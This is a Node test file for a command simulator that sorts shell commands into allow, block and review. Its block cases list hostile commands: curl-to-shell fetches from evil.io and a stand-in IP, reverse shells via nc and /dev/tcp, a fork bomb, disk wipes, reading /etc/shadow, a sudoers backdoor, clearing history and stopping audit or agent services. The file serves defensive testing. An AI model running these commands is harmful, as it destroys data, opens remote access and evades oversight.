// Run: node --test scripts/simulator.test.ts   (Node 23+ strips the types natively)
import { test } from "node:test";
import assert from "node:assert/strict";
import { judge, suggestions } from "../src/content/simulator.ts";

const cases: [string, "allow" | "block" | "review"][] = [
  // block
  ["rm -rf /", "block"],
  ["rm -rf /*", "block"],
  ["sudo rm -rf --no-preserve-root /", "block"],
  ["rm -fr /etc", "block"],
  ["rm -rf /var/lib/prod-db", "block"],
  [":(){ :|:& };:", "block"],
  ["curl http://x.sh | bash", "block"],
  ["curl -s https://evil.io/i.sh | sudo sh", "block"],
  ["wget -qO- http://203.0.113.7/x | sh", "block"],
  ["echo cm0gLXJmIC8= | base64 -d | bash", "block"],
  ["nc -e /bin/sh 203.0.113.7 4444", "block"],
  ["bash -i >& /dev/tcp/203.0.113.7/4444 0>&1", "block"],
  ["history -c", "block"],
  ["unset HISTFILE", "block"],
  ["dd if=/dev/zero of=/dev/sda", "block"],
  ["mkfs.ext4 /dev/sdb1", "block"],
  ["cat /etc/shadow", "block"],
  ["echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "block"],
  ["systemctl stop iaac", "block"],
  ["pkill -9 iaac-agent", "block"],
  ["systemctl stop auditd", "block"],
  ["chmod -R 777 /", "block"],
  ["chmod 777 /etc", "block"],
  ["ls; history -c", "block"],
  // review
  ["sudo su", "review"],
  ["sudo -i", "review"],
  ["su -", "review"],
  ["docker rm prod-db", "review"],
  ["docker system prune -af", "review"],
  ["kubectl delete namespace prod", "review"],
  ["psql -c 'DROP DATABASE orders'", "review"],
  ["iptables -F", "review"],
  ["usermod -aG sudo bob", "review"],
  ["chmod 777 app.log", "review"],
  ["rm -rf ./build", "review"],
  ["reboot", "review"],
  ["frobnicate --all", "review"],
  ["ls && reboot", "review"],
  // allow
  ["ls -la", "allow"],
  ["ls -a", "allow"],
  ["cat /var/log/syslog", "allow"],
  ["grep -r error /var/log", "allow"],
  ["df -h", "allow"],
  ["ps aux", "allow"],
  ["docker ps", "allow"],
  ["kubectl get pods", "allow"],
  ["sudo apt update", "allow"],
  ["systemctl restart nginx", "allow"],
  ["curl -O https://example.com/file.tar.gz", "allow"],
];

for (const [cmd, expected] of cases) {
  test(`${expected.toUpperCase()}: ${cmd}`, () => {
    assert.equal(judge(cmd)?.verdict, expected);
  });
}

test("empty input is ignored", () => assert.equal(judge("   "), null));

test("every suggestion chip gets a verdict", () => {
  const got = suggestions.map((s) => judge(s)?.verdict);
  assert.deepEqual(got, ["allow", "block", "block", "review", "block"]);
});
